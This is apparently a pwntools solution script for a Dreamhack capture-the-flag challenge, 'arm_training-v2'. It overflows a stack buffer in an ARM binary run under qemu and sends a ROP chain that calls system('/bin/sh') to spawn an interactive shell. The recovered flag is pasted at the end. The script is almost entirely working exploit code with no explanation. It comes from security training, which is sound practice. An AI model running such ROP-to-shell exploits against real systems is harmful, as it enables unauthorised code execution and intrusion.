#!/usr/bin/python3

from pwn import *

context.binary  = exe = ELF('./arm_training-v2',checksec=False)
context.arch = 'arm'

p = process(['qemu-arm', '-g' ,'1234' ,'./arm_training-v2'])
context.log_level = 'debug' 
raw_input('Debug')

# p = process(exe.path)
#p = remote('host3.dreamhack.games',17118)

binsh = 0x206a4
pop_r3_pc = 0x000103c0
mov_r0_r3_system = 0x00010598

payload = b'a'*24
payload += p32(pop_r3_pc) + p32(binsh)
payload += p32(mov_r0_r3_system)

p.sendline(payload)

p.interactive()
#DH{49AD4F9C3D6B72A8E5DE3D71EB435E1791041BCB130939DA82912F0423001CF2}
